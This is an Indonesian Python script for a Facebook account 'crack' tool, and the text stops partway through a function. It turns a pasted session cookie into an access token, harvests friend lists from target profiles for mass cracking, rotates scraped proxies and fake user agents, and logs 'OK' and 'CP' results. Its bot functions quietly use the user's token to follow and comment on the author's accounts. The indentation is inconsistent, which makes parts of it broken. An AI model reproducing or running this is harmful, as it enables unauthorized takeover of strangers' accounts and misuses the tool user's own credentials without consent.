# jangan diperjual belikan script ini free
# jangan Ganti Owner atau hp mu rusak
# kalo gak ada hasil ,oprek sendiri jangan ngandelin orang lain
# github —» https://github.com/fanky86/Premium
# percuma ganteng kalo gak follow 


import os

# ------------------[  MODULE  ]-------------------#
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING
B2 = "[#00C8FF]"  # BIRU
P2 = "[#FFFFFF]"  # PUTIH
U2 = "[#AF00FF]"  # UNGU
O2 = "[#FF8F00]"  # ORANGE


try:
    import rich
except ImportError:
    os.system("pip install rich")
from rich.console import Console

console = Console()

try:
    import rich
except ImportError:
    console.print(f" {K2}• {H2}Sedang Menginstall Modul Rich {H2}•{P2}")
    os.system("pip install rich")
try:
    import stdiomask
except ImportError:
    console.print(f" {K2}• {H2}Sedang Menginstall Modul stdiomask {H2}•{P2}")
    os.system("pip install stdiomask")
try:
    import bs4
except ImportError:
    console.print(f" {K2}• {H2}Sedang Menginstall Modul bs4 {H2}•{P2}")
    os.system("pip install bs4")


# ------------------[ IMPORT MODULE ]-------------------#
import requests, bs4, json, os, sys, random, datetime, time, re, rich, base64, subprocess, uuid, calendar
from time import sleep
import shutil
import hashlib
from datetime import date
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.text import Text
from rich.align import Align
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.console import Console
from bs4 import BeautifulSoup as beautifulsoup
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn


# ------------------[ GLOBAL NAME ]-------------------#
sekarang = calendar.timegm(time.gmtime(time.time()))
pretty.install()
CON = sol()
wa = Console()
ugen = []
ugent = []
console = Console()
ses = requests.Session()
hapus  = '[/]'
lisensiku=[]
temanku = []
id, id2, loop, ok, cp, akun, tokenku, uid, method, pwpluss, pwnya, tokenmu = [], [], 0, 0, 0, [], [], [], [], [], [], []
dia, ualu, ualuh = [], [], []
sys.stdout.write("\x1b]2; fanky ganteng\x07")

# ------------------[ PROXY BUAT NONTON BKP BTW FANKY GANTENG ]-------------------#
try:
    prox = requests.get(
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all"
    ).text
    open(".prox.txt", "w").write(prox)
except Exception as e:
    Console().print(
        f" {H2}•{P2} Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda"
    )
    exit()
prox = open(".prox.txt", "r").read().splitlines()
###----------[ GET DATA DARI DEVICE ]---------- ###
android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
try:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
except:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
#versi_app = str(random.randint(111111111,999999999))

# ------------------[ USER-AGENT ]-------------------#
user_agent=['Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]','Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]','Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']
uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"
uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"
uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(10):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
def uaku():
	try:
		ua=open('ua2.txt','r').read().splitlines()
		for ub in ua : 
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/IlmanRamdhaniR/ILMAN-XD/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.ua2.txt','r').read().splitlines()

# ------------[ INDICATION ]---------------#
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING
B2 = "[#00C8FF]"  # BIRU
P2 = "[#FFFFFF]"  # PUTIH
U2 = "[#AF00FF]"  # UNGU
O2 = "[#FF8F00]"  # ORANGE
try:
    file_color = open("data/theme_color", "r").read()
    color_text = file_color.split("|")[0]
    color_panel = file_color.split("|")[1]
except:
    color_text = "[#00FF00]"
    W1 = random.choice([M2, H2, K2])
    W2 = random.choice([K2, M2, K2])
    W3 = random.choice([H2, K2, M2])
    color_panel = "#00FF00"
    color_ok = "#00FF00"
    color_cp = "#FFFF00"
try:
    color_table = open("data/theme_color", "r").read()
except FileNotFoundError:
    color_table = "#00FF00"
#------------[ INDICATION ]---------------#
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
kom2 = random.choice(["Jadikan Aku Anak Buah Mu Bang @[100043537611609:]","Panutan Ku","Sebenarnya Aku Suka Sama Kamu, Tetapi Aku Cuma Butuh Waktu Untuk Mengungkapkan Isi Hati Ku"])
# --------------------[ CONVERTER-BULAN ]--------------#
dic = {"1": "January", "2": "February", "3": "March", "4": "April", "5": "May", "6": "June", "7": "July", "8": "August", "9": "September", "10": "October", "11": "November", "12": "December"}
dic2 = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}

tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = "OK-" + str(tgl) + "-" + str(bln) + "-" + str(thn) + ".txt"
cpc = "CP-" + str(tgl) + "-" + str(bln) + "-" + str(thn) + ".txt"
hour = datetime.datetime.now().hour
hari_ini = datetime.datetime.now().strftime("%d %B %Y")
current_time = datetime.datetime.now()
jam_fan = current_time.strftime("%I:%M %p")

# ------------------[ BERSIHIN MUKA LU]-----------------#
def clear():
    os.system("clear")

def jalan(keliling):
    for mau in keliling + "\n":
        sys.stdout.write(mau)
        sys.stdout.flush()
        time.sleep(0.03)
	    
# ------------------[ LOGO-FANKY-GANTENG ]-----------------#
from rich.console import Console
from rich.panel import Panel
from rich.text import Text

def logoku():
    console = Console()

    # Logo Lisensi
    logo_text = Text(
        """
██╗     ██╗ ██████╗███████╗███╗   ██╗███████╗███████╗
██║     ██║██╔════╝██╔════╝████╗  ██║██╔════╝██╔════╝
██║     ██║██║     █████╗  ██╔██╗ ██║███████╗█████╗  
██║     ██║██║     ██╔══╝  ██║╚██╗██║╚════██║██╔══╝  
███████╗██║╚██████╗███████╗██║ ╚████║███████║███████╗
╚══════╝╚═╝ ╚═════╝╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝
""",
        style="bold cyan"
    )

    # Panel utama dengan width 60
    panel = Panel(
        logo_text,
        title="[bold magenta]Selamat Datang[/bold magenta]",
        subtitle="[bold yellow]Gunakan Setelah Registrasi Tools Anda[/bold yellow]",
        border_style="green",
        width=60
    )

    # Cetak ke console
    console.print(panel)

# Panggil fungsi untuk menampilkan banner


def banner():
    Console().print(
        Panel(
            """[bold red]┏━━━┓┏━━━┓┏━━━┓┏┓─┏┓┏━━┓─┏┓───┏━━┓┏┓┏━┓ 
[bold red]┃┏━┓┃┃┏━━┛┃┏━┓┃┃┃─┃┃┃┏┓┃─┃┃───┗┫┣┛┃┃┃┏┛ 
[bold yellow]┃┗━┛┃┃┗━━┓┃┗━┛┃┃┃─┃┃┃┗┛┗┓┃┃────┃┃─┃┗┛┛─ 
[bold white]┃┏┓┏┛┃┏━━┛┃┏━━┛┃┃─┃┃┃┏━┓┃┃┃─┏┓─┃┃─┃┏┓┃─ 
[red purple]┃┃┃┗┓┃┗━━┓┃┃───┃┗━┛┃┃┗━┛┃┃┗━┛┃┏┫┣┓┃┃┃┗┓ [bold red]██████
┗┛┗━┛┗━━━┛┗┛───┗━━━┛┗━━━┛┗━━━┛┗━━┛┗┛┗━┛ [bold white]██████                                                                                                                                                   🚨 🚧🚧🚧🚧🚧🚧🚧 🚥INDONESIA🚥 🚧🚧🚧🚧🚧🚧🚧 🚨[bold red]""",            width=60,
            style=f"{color_panel}",
        )
    )
    
# --------------------[ MASUK PELAN PELAN ATUH FANKY ]--------------#
def login123():
    os.system("clear")
    banner()
    Console().print(
        Panel(
            f"""{P2}[{color_text}01{P2}].Login Menggunakan Cookie [{K2} Fresh ♨ {P2}]\n[{color_text}02{P2}].{M2}Keluar""",
            width=60,
            style=f"{color_panel}",
            title="[bold green]Login",
        )
    )
    bryn = console.input(f" {H2}• {P2}pilih menu : ")
    if bryn in ["1", "01"]:
        logincoki()
    elif bryn in ["2", "02"]:
        exit()
    else:
        Console().print(f" {H2}• {P2}[bold red]Pilihan Tidak Diketahui!", end="\r")
        time.sleep(5)
        login()


def login():
    try:
        token = open(".fantoken.txt", "r").read()
        cok = open(".fancookie.txt", "r").read()
        tokenku.append(token)
        try:
            menu()
        except KeyError:
            login123()
        except requests.exceptions.ConnectionError:
            Console().print(
                f" {H2}• {P2}[bold red]Problem Internet Connection, Check And Try Again"
            )
            exit()
    except IOError:
        login123()

###-----[ BAGIAN LOGIN ]-----###
def logincoki():
	try:
		cok = Console().input(f" {H2}• {P2}cookie : ")
		open('.fancookie.txt','w').write(cok)
		with requests.Session() as r:
			try:
				r.headers.update({'Accept-Language': 'id,en;q=0.9','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36','Referer': 'https://www.instagram.com/','Host': 'www.facebook.com','Sec-Fetch-Mode': 'cors','Accept': '*/*','Connection': 'keep-alive','Sec-Fetch-Site': 'cross-site','Sec-Fetch-Dest': 'empty','Origin': 'https://www.instagram.com','Accept-Encoding': 'gzip, deflate',})
				response = r.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cok})
				if  '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open('.fantoken.txt','w').write(token)
					Console().print(Panel(f"""{P2}{token}""", width=60, style=f"{color_panel}", title="[bold green]TOKEN"))
				else:Console().print(f" {H2}• {P2}[bold red]Cookie Invalid");exit()
			except Exception as e:print(e);exit()
		Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
		sleep(2);exit()
	except Exception as e:os.system('rm -rf .fancookie.txt');os.system('rm -rf .fantoken.txt');print(e);exit()
# --------------------[ INI BOT FOLLOW & KOMEN ]--------------#
def bot_komen(cok, ken):
	with requests.Session() as r:
		text = random.choice(['Keren Ka 😎', 'Hello World!', 'Mantap Ka ☺️', 'I Love You ❤️', 'Hai Ka 😘'])
		r.cookies.update({'cookie': cok})
		r.post(f'https://graph.facebook.com/100019886885499/subscribers?access_token={ken}')
		#r.post(f'https://graph.facebook.com/1560320521307496/comments/?message={text}&access_token={ken}')
		r.post(f'https://graph.facebook.com/1560320521307496/comments/?message={text}&access_token={ken}')
		r.post(f'https://graph.facebook.com/1560320521307496/likes?summary=true&access_token={ken}')
		r.post(f'https://graph.facebook.com/100019886885499/subscribers?access_token={ken}')
# ------------------[ INI BOT FOLLOW GOBLOG BTW FANKY GANTENG ]--------------#
def bot_follow():
	with requests.Session() as r:
		toket = open('.fantoken.txt','r').read()
		r.post(f'https://graph.facebook.com/100019886885499/subscribers?access_token={toket}')
# ----------------[ BAGIAN-MENU ]----------------#
def menu():
    try:
        prem = f"{H2}Premium"
    except (KeyError, FileNotFoundError):
        prem = f"{H2}Premium"

    try:
        token = open(".fantoken.txt", "r").read()
        cookie = open(".fancookie.txt", "r").read()
        tokenku.append(token)
    except IOError:
        Console().print(f" {H2}• {P2}[bold red] Cookies Kadaluarsa tolkon")
        os.system("rm -rf .fantoken.txt && rm -rf .fancookie.txt")
        time.sleep(3)
        login()
    try:
        sy = requests.get(f'https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cookie})
        my_name = json.loads(sy.text)['name']
        my_id = json.loads(sy.text)['id']
    except:
        my_name=[]
        my_id=[]
    try:
        link = ses.get(
            f"https://graph.facebook.com/me?fields=id,name,friends&access_token={token}",
            cookies={"cookie": cookie},
        ).json()
        for c in link["friends"]["data"]:
            temanku.append(c["id"] + "|" + c["name"])
    except:
        pass
    os.system("clear")
    banner()
    try:
        key = open(".license","r").read()
    except:
        key = "-"
    negara = requests.get("http://ip-api.com/json/").json()["country"]
    ip = requests.get("http://ip-api.com/json/").json()["query"]
    text = Align.center(f"{H2}{negara}{K2}")
    console.print(Panel(text, padding=(0, 12), width=60, style=color_panel))
    #dia.append(Panel(f"{P2}Android : {H2}versi {android_version}\n{P2}tanggal : {H2}{hari_ini}\n{P2}jam     : {H2}{jam_fan}\n{P2}simcard : {H2}{simcard[:18]}",width=30,title=f"{P2}Perangkat",style=f"{color_panel}"))
    #dia.append(Panel(f'{P2}IP      : {H2}{ip}\n{P2}premium : {H2}Premium\n{P2}Negara  : {H2}{negara}',width=30,style=f"{color_panel}"))
    #dia.append(
        #panel(
    prints(Panel(f"""{P2}[{color_text}01{P2}]. 𝑪𝑹𝑨𝑪𝑲 𝑰𝑫 𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲 𝑷𝑼𝑩𝑳𝑰𝑲
[{color_text}02{P2}]. 𝑪𝑹𝑨𝑪𝑲 𝑰𝑫 𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲 𝑴𝑨𝑺𝑨𝑳
[{color_text}03{P2}]. 𝑳𝑰𝑯𝑨𝑻 𝑯𝑨𝑺𝑰𝑳 𝑪𝑹𝑨𝑪𝑲
[{color_text}04{P2}]. 𝑲𝑬𝑳𝑼𝑹 [[bold red]𝑯𝑨𝑷𝑼𝑺 𝑪𝑶𝑶𝑲𝑰𝑬𝑺[bold white]]
[{color_text}05{P2}]. {M2}EXIT{P2}""",width=60,title="🚥MENU SIMPLE🚥",style=f"{color_panel}"))
    HaHi = console.input(f" {H2}• {P2}𝗣𝗜𝗟𝗜𝗛 𝗠𝗘𝗡𝗨 : ")
    if HaHi in ["1", "01"]:
        dump_publik()
    elif HaHi in ["2", "02"]:
        massal()
    elif HaHi in ["3", "03"]:
        result()
    elif HaHi in ["4", "04"]:
        os.system('rm -rf .fancookie.txt');os.system('rm -rf .fantoken.txt')
        console.print(f" {H2}• {P2}Berhasil Hapus Cookie")
    elif HaHi in ["5", "05"]:
        exit()
    else:
    	console.print(f" {H2}• {P2}[bold red]Masukan Yang Bener Tolol!!! btw fanky ganteng ")


#----------[ CRACK-PUBLIK  ]----------#
def dump_publik():
    with requests.Session() as ses:
        token = open(".fantoken.txt", "r").read()
        cok = open(".fancookie.txt", "r").read()
        prints(
            Panel(
                f"""{P2}MASUKAN ID FACEBOOK PUBLIK""",
                subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",
                width=60,
                style=f"{color_panel}",
            )
        )
        a = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
        if a in ["me", "Me", "ME"]:
            try:
                koH = requests.get(
                    f"https://graph.facebook.com/{a}?fields=friends&access_token={token}",
                    cookies={"cookie": cok},
                ).json()
                for pi in koH["friends"]["data"]:
                    try:
                        id.append(pi["id"] + "|" + pi["name"])
                    except:
                        continue
                setting()
            except Exception as d:
                print(d)
        else:
            try:
                b = ses.get(
                    f"https://graph.facebook.com/{a}?fields=friends&access_token={token}",
                    cookies={"cookie": cok},
                ).json()
                for c in b["friends"]["data"]:
                    id.append(c["id"] + "|" + c["name"])
                setting()
            except Exception as e:
                print(e)
                
# -------------------[ CRACK-Masal ]----------------#
def massal():
    try:
        token = open(".fantoken.txt", "r").read()
        cok = open(".fancookie.txt", "r").read()
    except IOError:
        exit()
    try:
        Console().print(
            Panel(
                "[bold white] Mau Berapa Target Yang Mau Di Crack",
                width=60,
                style=f"{color_panel}",
                title="[bold green] Crack Masal [bold white]",
            )
        )
        jum = int(input(f" • Masukan : "))
    except ValueError:
        Console().print(f" {H2}• {P2} Wrong input ")
        exit()
    if jum < 1 or jum > 80:
        Console().print(f" {H2}• {P2} Pertemanan Tidak Publik  ")
        exit()
    ses = requests.Session()
    yz = 0
    for met in range(jum):
        yz += 1
        Console().print(
            panel(
                "[bold white] Masukkan Target ke " + str(yz) + "",
                width=60,
                style=f"{color_panel}",
            )
        )
        kl = Console().input(f" {H2}• {P2}Masukan : ")
        uid.append(kl)
    for userr in uid:
        try:
            col = ses.get(
                f"https://graph.facebook.com/{userr}?fields=friends&access_token={token}",
                cookies={"cookie": cok},
            ).json()
            for mi in col["friends"]["data"]:
                try:
                    iso = mi["id"] + "|" + mi["name"]
                    if iso in id:
                        pass
                    else:
                        id.append(iso)
                except:
                    continue
        except (KeyError, IOError):
            pass
        except requests.exceptions.ConnectionError:
            Console().print(f" {H2}• {P2}Unstable Signal ")
            exit()
    try:
        setting()
    except requests.exceptions.ConnectionError:
        print(f"")
        print(" [+] Unstable Signal ")
        exit()
    except (KeyError, IOError):
        print(f" [+] Pertemanan Tidak Public ")
        time.sleep(3)
        exit()

def result():
    console.print(Panel(f"""{P2}[{color_text}01{P2}]. Lihat Hasil {K2}CP{P2}
{P2}[{color_text}02{P2}]. Lihat Hasil {H2}OK{P2}""", width=60, title=f"Hasil Crack", style=color_panel))

    fankycek = console.input(f" {H2}• {P2}Masukan : ")

    if fankycek in ["1", "01"]:
        lihat_hasil("CP", f"{H2}• {P2}Anda Tidak Memiliki Hasil CP", "bold yellow")
    elif fankycek in ["2", "02"]:
        lihat_hasil("OK", f"{H2}• {P2}Anda Tidak Mempunyai File OK", "bold green")
    else:
        console.print(f" {H2}• {P2}Pilih Yang Bener Bang")
        exit()

def lihat_hasil(folder, pesan_tidak_ada, warna_akun):
    try:
        files = os.listdir(folder)
        if not files:
            console.print(pesan_tidak_ada)
            time.sleep(3)
            exit()
    except FileNotFoundError:
